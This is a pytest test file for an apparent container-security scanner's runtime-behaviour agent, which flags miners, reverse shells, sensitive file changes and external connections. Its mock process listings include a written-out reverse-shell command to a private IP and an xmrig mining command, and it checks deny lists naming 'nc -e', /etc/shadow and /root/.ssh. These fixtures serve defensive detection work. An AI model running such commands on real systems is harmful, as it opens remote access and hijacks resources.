"""Tests for RuntimeBehaviorAgent."""

from __future__ import annotations

import json
from unittest.mock import AsyncMock, patch

import pytest

from aisec.agents.runtime_behavior import (
    SENSITIVE_PATHS,
    SUSPICIOUS_PROCESSES,
    RuntimeBehaviorAgent,
)
from aisec.core.enums import AgentPhase, Severity


class TestRuntimeBehaviorAgentMetadata:
    """Test agent class attributes."""

    def test_name(self):
        assert RuntimeBehaviorAgent.name == "runtime_behavior"

    def test_phase(self):
        assert RuntimeBehaviorAgent.phase == AgentPhase.DYNAMIC

    def test_frameworks(self):
        assert "LLM06" in RuntimeBehaviorAgent.frameworks
        assert "ASI05" in RuntimeBehaviorAgent.frameworks
        assert "ASI10" in RuntimeBehaviorAgent.frameworks

    def test_depends_on(self):
        assert "network" in RuntimeBehaviorAgent.depends_on
        assert "permission" in RuntimeBehaviorAgent.depends_on


class TestConstants:
    """Test agent constants."""

    def test_suspicious_processes_populated(self):
        assert len(SUSPICIOUS_PROCESSES) >= 5
        assert "xmrig" in SUSPICIOUS_PROCESSES
        assert "nc -e" in SUSPICIOUS_PROCESSES

    def test_sensitive_paths_populated(self):
        assert len(SENSITIVE_PATHS) >= 5
        assert "/etc/shadow" in SENSITIVE_PATHS
        assert "/root/.ssh" in SENSITIVE_PATHS


class TestNoContainer:
    """Test agent behavior without a container."""

    @pytest.mark.asyncio
    async def test_no_container(self, scan_context):
        agent = RuntimeBehaviorAgent(scan_context)
        await agent.analyze()
        assert len(agent.findings) == 1
        assert "No container" in agent.findings[0].title


class TestProcessMonitoring:
    """Test process monitoring."""

    @pytest.mark.asyncio
    async def test_detect_crypto_miner(self, scan_context):
        scan_context.container_id = "test-container"
        agent = RuntimeBehaviorAgent(scan_context)

        ps_output = (
            "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
            "root         1  0.0  0.1   4244  3200 ?        Ss   10:00   0:00 /bin/sh\n"
            "root        50 95.0 10.0 500000 200000 ?       R    10:01   5:00 xmrig --pool mining.pool.com\n"
        ).encode()

        async def mock_exec(*args, **kwargs):
            proc = AsyncMock()
            if "ps" in str(args):
                proc.returncode = 0
                proc.communicate = AsyncMock(return_value=(ps_output, b""))
            else:
                proc.returncode = 1
                proc.communicate = AsyncMock(return_value=(b"", b""))
            return proc

        with patch("asyncio.create_subprocess_exec", side_effect=mock_exec):
            await agent._check_processes("test-container")

        suspicious_findings = [
            f for f in agent.findings if "Suspicious" in f.title
        ]
        assert len(suspicious_findings) == 1
        assert suspicious_findings[0].severity == Severity.CRITICAL

    @pytest.mark.asyncio
    async def test_detect_reverse_shell(self, scan_context):
        scan_context.container_id = "test-container"
        agent = RuntimeBehaviorAgent(scan_context)

        ps_output = (
            "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
            "root         1  0.0  0.1   4244  3200 ?        Ss   10:00   0:00 /bin/sh\n"
            "www-data   100  0.5  0.2   8000  4000 ?        S    10:02   0:01 bash -i >& /dev/tcp/10.0.0.1/4444\n"
        ).encode()

        async def mock_exec(*args, **kwargs):
            proc = AsyncMock()
            if "ps" in str(args):
                proc.returncode = 0
                proc.communicate = AsyncMock(return_value=(ps_output, b""))
            else:
                proc.returncode = 1
                proc.communicate = AsyncMock(return_value=(b"", b""))
            return proc

        with patch("asyncio.create_subprocess_exec", side_effect=mock_exec):
            await agent._check_processes("test-container")

        findings = [f for f in agent.findings if "Suspicious" in f.title]
        assert len(findings) >= 1

    @pytest.mark.asyncio
    async def test_clean_processes(self, scan_context):
        scan_context.container_id = "test-container"
        agent = RuntimeBehaviorAgent(scan_context)

        ps_output = (
            "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
            "app          1  0.5  1.0  50000 20000 ?        Ss   10:00   0:00 python app.py\n"
            "app         10  0.1  0.5  30000 10000 ?        S    10:00   0:00 gunicorn worker\n"
        ).encode()

        async def mock_exec(*args, **kwargs):
            proc = AsyncMock()
            proc.returncode = 0
            proc.communicate = AsyncMock(return_value=(ps_output, b""))
            return proc

        with patch("asyncio.create_subprocess_exec", side_effect=mock_exec):
            await agent._check_processes("test-container")

        suspicious_findings = [
            f for f in agent.findings if "Suspicious" in f.title
        ]
        assert len(suspicious_findings) == 0


class TestFilesystemMonitoring:
    """Test filesystem change monitoring."""

    @pytest.mark.asyncio
    async def test_sensitive_file_modification(self, scan_context):
        agent = RuntimeBehaviorAgent(scan_context)

        diff_output = (
            "C /etc\n"
            "C /etc/shadow\n"
            "A /root/.ssh/authorized_keys\n"
            "C /tmp\n"
            "A /tmp/payload.sh\n"
        ).encode()

        async def mock_exec(*args, **kwargs):
            proc = AsyncMock()
            proc.returncode = 0
            proc.communicate = AsyncMock(return_value=(diff_output, b""))
            return proc

        with patch("asyncio.create_subprocess_exec", side_effect=mock_exec):
            await agent._check_filesystem_changes("test-container")

        sensitive_findings = [
            f for f in agent.findings if "Sensitive" in f.title
        ]
        assert len(sensitive_findings) == 1
        assert sensitive_findings[0].severity == Severity.CRITICAL

    @pytest.mark.asyncio
    async def test_no_changes(self, scan_context):
        agent = RuntimeBehaviorAgent(scan_context)

        async def mock_exec(*args, **kwargs):
            proc = AsyncMock()
            proc.returncode = 0
            proc.communicate = AsyncMock(return_value=(b"", b""))
            return proc

        with patch("asyncio.create_subprocess_exec", side_effect=mock_exec):
            await agent._check_filesystem_changes("test-container")

        assert len(agent.findings) == 0


class TestNetworkConnections:
    """Test network connection monitoring."""

    @pytest.mark.asyncio
    async def test_external_connections(self, scan_context):
        agent = RuntimeBehaviorAgent(scan_context)

        ss_output = (
            "Netid  State     Recv-Q  Send-Q  Local Address:Port  Peer Address:Port\n"
            "tcp    ESTAB     0       0       172.17.0.2:8080     45.33.32.156:443\n"
            "tcp    LISTEN    0       128     0.0.0.0:8080        0.0.0.0:*\n"
        ).encode()

        async def mock_exec(*args, **kwargs):
            proc = AsyncMock()
            proc.returncode = 0
            proc.communicate = AsyncMock(return_value=(ss_output, b""))
            return proc

        with patch("asyncio.create_subprocess_exec", side_effect=mock_exec):
            await agent._check_network_connections("test-container")

        external_findings = [
            f for f in agent.findings if "External" in f.title
        ]
        assert len(external_findings) == 1
        assert external_findings[0].severity == Severity.HIGH


class TestResourceUsage:
    """Test resource usage monitoring."""

    @pytest.mark.asyncio
    async def test_high_cpu_usage(self, scan_context):
        agent = RuntimeBehaviorAgent(scan_context)

        stats = json.dumps({
            "cpu": "95.5%",
            "mem": "256MiB / 2GiB",
            "mem_perc": "12.5%",
            "net": "1.2MB / 500KB",
            "pids": "15",
        }).encode()

        async def mock_exec(*args, **kwargs):
            proc = AsyncMock()
            proc.returncode = 0
            proc.communicate = AsyncMock(return_value=(stats, b""))
            return proc

        with patch("asyncio.create_subprocess_exec", side_effect=mock_exec):
            await agent._check_resource_usage("test-container")

        cpu_findings = [
            f for f in agent.findings if "CPU" in f.title
        ]
        assert len(cpu_findings) == 1
        assert cpu_findings[0].severity == Severity.HIGH

    @pytest.mark.asyncio
    async def test_normal_usage(self, scan_context):
        agent = RuntimeBehaviorAgent(scan_context)

        stats = json.dumps({
            "cpu": "5.0%",
            "mem": "256MiB / 2GiB",
            "mem_perc": "12.5%",
            "net": "1.2MB / 500KB",
            "pids": "5",
        }).encode()

        async def mock_exec(*args, **kwargs):
            proc = AsyncMock()
            proc.returncode = 0
            proc.communicate = AsyncMock(return_value=(stats, b""))
            return proc

        with patch("asyncio.create_subprocess_exec", side_effect=mock_exec):
            await agent._check_resource_usage("test-container")

        assert len(agent.findings) == 0
